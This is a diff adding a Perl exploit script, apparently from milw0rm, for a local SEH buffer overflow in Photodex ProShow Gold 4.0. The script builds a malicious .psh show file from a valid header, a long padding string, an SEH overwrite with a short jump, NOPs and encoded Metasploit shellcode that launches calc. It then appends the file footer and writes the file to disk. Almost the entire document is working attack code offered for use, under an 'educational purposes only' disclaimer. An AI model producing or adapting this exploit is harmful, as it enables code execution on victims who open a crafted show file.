@@ -1,0 +1,254 @@
+#
+# [+] Vulnerability     : ProShow Gold 4 BOF
+# [+] Detected by       : Bkis - http://blog.bkis.com/?p=737
+# [*] Sploit coded by   : corelanc0d3r  (corelanc0d3r[at]gmail[dot]com)
+# [*] Sploit coded on   : August 20, 2009
+# [*] Type              : local
+# [*] OS                : Windows
+# [*] Product           : Photodex ProShow Gold
+# [*] Versions affected : 4.0
+# [*] Download link     : http://www.photodex.com/downloads/go_proshowgold
+# [*] -------------------------------------------------------------------------
+# [*] Method            : SEH - Universal
+# [*] Tested on         : Windows XP SP3 En
+# [*] Greetz&Tx to      : Saumil/SK
+# [*] -------------------------------------------------------------------------
+#                                               MMMMM~.                          
+#                                               MMMMM?.                          
+#    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.   
+#  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:  
+#  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:  
+#  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:  
+#  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:  
+#  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:  
+#  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:  
+#  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:  
+#     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.  
+#                                                                   eip hunters
+# -----------------------------------------------------------------------------
+# Script provided 'as is', without any warranty. 
+# Use for educational purposes only.
+#
+print " [+] Preparing payload\n";
+my $sploitfile="proshowsploit.psh";
+my $fileheader="Photodex(R) ProShow(TM) Show File Version=0\n".
+"proshowVersion=2549\n".
+"title=Untitled ProShow 1\n".
+"fileName=proshowsploit.psh\n".
+"description=''\n".
+"showAspect=1\n".
+"showSizeX=16\n".
+"showSizeY=9\n".
+"loop=1\n".
+"loopRestart=1\n".
+"displaySizeX=704\n".
+"displaySizeY=528\n".
+"videoSizeX=720\n".
+"videoSizeY=480\n".
+"videoFrameRate=29970\n".
+"videoBitRate=1120000\n".
+"videoMuxBitRate=1394400\n".
+"outputImageSizeX=1024\n".
+"outputImageSizeY=768\n".
+"outputQuality=80\n".
+"toolbarEnable=1\n".
+"allowQuit=1\n".
+"allowPlay=1\n".
+"allowTime=1\n".
+"allowRestart=1\n".
+"allowSave=1\n".
+"allowSaveAll=1\n".
+"allowPrint=1\n".
+"allowPrintAll=1\n".
+"allowCopy=1\n".
+"allowSaver=1\n".
+"allowCta=1\n".
+"ctaLabel=ProShow Info\n".
+"ctaURL=http://www.photodex.com/\n".
+"background=1\n".
+"bgOutlineColor=0\n".
+"bgSizeMode=1\n".
+"bgColorizeColor=8421504\n".
+"waterOpacity=128\n".
+"waterZoom=10000\n".
+"waterColorizeColor=8421504\n".
+"musicVolumeOffset=100\n".
+"defaultCellVolumeOffset=100\n".
+"defaultCellFadeIn=100\n".
+"defaultCellFadeOut=100\n".
+"defaultMusicVolumeOffset=50\n".
+"defaultMusicFadeIn=100\n".
+"defaultMusicFadeOut=100\n".
+"maxDispWidth=800\n".
+"maxDispHeight=600\n".
+"maxRender=1\n".
+"maxRenderWidth=800\n".
+"maxRenderHeight=600\n".
+"randomTransitions=FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF:FFFFFFFF\n".
+"makeFileLocalFolder=c:/\n".
+"cells=2\n".
+"cell[0].imageEnable=1\n".
+"cell[0].nrOfImages=1\n".
+"cell[0].images[0].image=../../../../../Media Sources/ProShow Gold - Built-In Content/Backgrounds/Abstract_02.jpg";
+my $junk = "A" x 6120;
+my $nseh = "\xeb\x18\x90\x90";
+my $seh = pack('V',0x01a614ea);
+my $nop="\x90" x 30;
+# windows/exec - 144 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# EXITFUNC=seh, CMD=calc
+my $shellcode="\xda\xd1\xd9\x74\x24\xf4\x2b\xc9\xb1\x1e\xbd\x78\x41\xbf" .
+"\x6f\x58\x83\xe8\xfc\x31\x68\x14\x03\x68\x6c\xa3\x4a\x93" .
+"\x64\x67\xb5\x6c\x74\xe3\xf0\x50\xff\x8f\xff\xd0\xfe\x80" .
+"\x8b\x6e\x18\xd4\xd3\x50\x19\x01\xa2\x1b\x2d\x5e\x34\xf2" .
+"\x7c\xa0\xae\xa6\xfa\xe0\xa5\xb1\xc3\x2b\x48\xbf\x01\x40" .
+"\xa7\x84\xd1\xb3\x4c\x8e\x3c\x30\x13\x54\xbf\xac\xca\x1f" .
+"\xb3\x79\x98\x7f\xd7\x7c\x75\xf4\xfb\xf5\x88\xe0\x8a\x56" .
+"\xaf\xf2\x4f\x39\x9e\x0c\x2f\x90\x84\x7b\xe9\x2c\xce\x3c" .
+"\xf9\xc7\xa0\xa0\xac\x53\x28\xd1\x27\x9b\x2a\x21\x5d\x0c" .
+"\x45\x52\x2b\xa8\xca\xfa\xb3\x4f\x7e\xf4\x94\x50\x98\x6a" .
+"\x7b\xc3\x04\x6d";
+
+my $junk2="D" x (2000-length($shellcode));
+my $filefooter = "\ncell[0].images[0].imageEnable=1\n".
+"cell[0].images[0].name=Abstract_02\n".
+"cell[0].images[0].replaceableTemplate=1\n".
+"cell[0].images[0].sizeMode=1\n".
+"cell[0].images[0].colorizeColor=8421504\n".
+"cell[0].images[0].colorizeStrength=10000\n".
+"cell[0].images[0].outlineColor=16777215\n".
+"cell[0].images[0].aspectX=4\n".
+"cell[0].images[0].aspectY=3\n".
+"cell[0].images[0].videoVolume=100\n".
+"cell[0].images[0].objectId=1\n".
+"cell[0].images[0].videoSpeed=100\n".
+"cell[0].images[0].nrOfKeyframes=2\n".
+"cell[0].images[0].keyframes[0].timeSegment=1\n".
+"cell[0].images[0].keyframes[0].attributeMask=-1\n".
+"cell[0].images[0].keyframes[0].zoomX=10000\n".
+"cell[0].images[0].keyframes[0].zoomY=10000\n".
+"cell[0].images[0].keyframes[0].panAccelType=1\n".
+"cell[0].images[0].keyframes[0].zoomXAccelType=1\n".
+"cell[0].images[0].keyframes[0].zoomYAccelType=1\n".
+"cell[0].images[0].keyframes[0].rotationAccelType=1\n".
+"cell[0].images[0].keyframes[0].motionSmoothness=-1\n".
+"cell[0].images[0].keyframes[0].lockAR=1\n".
+"cell[0].images[0].keyframes[0].transparency=0\n".
+"cell[0].images[0].keyframes[0].colorizeColor=8421504\n".
+"cell[0].images[0].keyframes[0].colorizeStrength=10000\n".
+"cell[0].images[0].keyframes[0].shadowOffsetX=70\n".
+"cell[0].images[0].keyframes[0].shadowOffsetY=70\n".
+"cell[0].images[0].keyframes[1].timestamp=10000\n".
+"cell[0].images[0].keyframes[1].timeSegment=3\n".
+"cell[0].images[0].keyframes[1].segmentTimestamp=10000\n".
+"cell[0].images[0].keyframes[1].attributeMask=-1\n".
+"cell[0].images[0].keyframes[1].zoomX=10000\n".
+"cell[0].images[0].keyframes[1].zoomY=10000\n".
+"cell[0].images[0].keyframes[1].panAccelType=1\n".
+"cell[0].images[0].keyframes[1].zoomXAccelType=1\n".
+"cell[0].images[0].keyframes[1].zoomYAccelType=1\n".
+"cell[0].images[0].keyframes[1].rotationAccelType=1\n".
+"cell[0].images[0].keyframes[1].motionSmoothness=-1\n".
+"cell[0].images[0].keyframes[1].lockAR=1\n".
+"cell[0].images[0].keyframes[1].transparency=0\n".
+"cell[0].images[0].keyframes[1].colorizeColor=8421504\n".
+"cell[0].images[0].keyframes[1].colorizeStrength=10000\n".
+"cell[0].images[0].keyframes[1].shadowOffsetX=70\n".
+"cell[0].images[0].keyframes[1].shadowOffsetY=70\n".
+"cell[0].background=1\n".
+"cell[0].bgDefault=1\n".
+"cell[0].bgSizeMode=1\n".
+"cell[0].bgColorizeColor=8421504\n".
+"cell[0].sound.useDefault=1\n".
+"cell[0].sound.volume=100\n".
+"cell[0].sound.fadeIn=100\n".
+"cell[0].sound.fadeOut=100\n".
+"cell[0].sound.async=1\n".
+"cell[0].sound.musicUseDefault=1\n".
+"cell[0].sound.musicVolume=50\n".
+"cell[0].sound.musicFadeIn=100\n".
+"cell[0].sound.musicFadeOut=100\n".
+"cell[0].musicVolumeOffset=50\n".
+"cell[0].time=3000\n".
+"cell[0].transId=2\n".
+"cell[0].transTime=3000\n".
+"cell[0].includeGlobalCaptions=1\n".
+"cell[1].imageEnable=1\n".
+"cell[1].nrOfImages=1\n".
+"cell[1].images[0].image=../../../../../Media Sources/ProShow Gold - Built-In Content/Backgrounds/Abstract_01.jpg\n".
+"cell[1].images[0].imageEnable=1\n".
+"cell[1].images[0].name=Abstract_01\n".
+"cell[1].images[0].replaceableTemplate=1\n".
+"cell[1].images[0].sizeMode=1\n".
+"cell[1].images[0].colorizeColor=8421504\n".
+"cell[1].images[0].colorizeStrength=10000\n".
+"cell[1].images[0].outlineColor=16777215\n".
+"cell[1].images[0].aspectX=4\n".
+"cell[1].images[0].aspectY=3\n".
+"cell[1].images[0].videoVolume=100\n".
+"cell[1].images[0].objectId=2\n".
+"cell[1].images[0].videoSpeed=100\n".
+"cell[1].images[0].nrOfKeyframes=2\n".
+"cell[1].images[0].keyframes[0].timeSegment=1\n".
+"cell[1].images[0].keyframes[0].attributeMask=-1\n".
+"cell[1].images[0].keyframes[0].zoomX=10000\n".
+"cell[1].images[0].keyframes[0].zoomY=10000\n".
+"cell[1].images[0].keyframes[0].panAccelType=1\n".
+"cell[1].images[0].keyframes[0].zoomXAccelType=1\n".
+"cell[1].images[0].keyframes[0].zoomYAccelType=1\n".
+"cell[1].images[0].keyframes[0].rotationAccelType=1\n".
+"cell[1].images[0].keyframes[0].motionSmoothness=-1\n".
+"cell[1].images[0].keyframes[0].lockAR=1\n".
+"cell[1].images[0].keyframes[0].transparency=0\n".
+"cell[1].images[0].keyframes[0].colorizeColor=8421504\n".
+"cell[1].images[0].keyframes[0].colorizeStrength=10000\n".
+"cell[1].images[0].keyframes[0].shadowOffsetX=70\n".
+"cell[1].images[0].keyframes[0].shadowOffsetY=70\n".
+"cell[1].images[0].keyframes[1].timestamp=10000\n".
+"cell[1].images[0].keyframes[1].timeSegment=3\n".
+"cell[1].images[0].keyframes[1].segmentTimestamp=10000\n".
+"cell[1].images[0].keyframes[1].attributeMask=-1\n".
+"cell[1].images[0].keyframes[1].zoomX=10000\n".
+"cell[1].images[0].keyframes[1].zoomY=10000\n".
+"cell[1].images[0].keyframes[1].panAccelType=1\n".
+"cell[1].images[0].keyframes[1].zoomXAccelType=1\n".
+"cell[1].images[0].keyframes[1].zoomYAccelType=1\n".
+"cell[1].images[0].keyframes[1].rotationAccelType=1\n".
+"cell[1].images[0].keyframes[1].motionSmoothness=-1\n".
+"cell[1].images[0].keyframes[1].lockAR=1\n".
+"cell[1].images[0].keyframes[1].transparency=0\n".
+"cell[1].images[0].keyframes[1].colorizeColor=8421504\n".
+"cell[1].images[0].keyframes[1].colorizeStrength=10000\n".
+"cell[1].images[0].keyframes[1].shadowOffsetX=70\n".
+"cell[1].images[0].keyframes[1].shadowOffsetY=70\n".
+"cell[1].background=1\n".
+"cell[1].bgDefault=1\n".
+"cell[1].bgSizeMode=1\n".
+"cell[1].bgColorizeColor=8421504\n".
+"cell[1].sound.useDefault=1\n".
+"cell[1].sound.volume=100\n".
+"cell[1].sound.fadeIn=100\n".
+"cell[1].sound.fadeOut=100\n".
+"cell[1].sound.async=1\n".
+"cell[1].sound.musicUseDefault=1\n".
+"cell[1].sound.musicVolume=50\n".
+"cell[1].sound.musicFadeIn=100\n".
+"cell[1].sound.musicFadeOut=100\n".
+"cell[1].musicVolumeOffset=50\n".
+"cell[1].time=3000\n".
+"cell[1].transId=2\n".
+"cell[1].transTime=3000\n".
+"cell[1].includeGlobalCaptions=1\n".
+"modifierCount=0\n";
+
+my $payload = $fileheader.$junk.$nseh.$seh.$nop.$shellcode.$junk2.$filefooter;
+
+print " [+] Writing payload to file\n";
+open($FILE,">$sploitfile");
+print $FILE $payload;
+close($FILE);
+print " [+] Exploit file " . $sploitfile . " created\n";
+print " [+] Wrote " . length($payload) . " bytes\n";
+
+# milw0rm.com [2009-08-24]
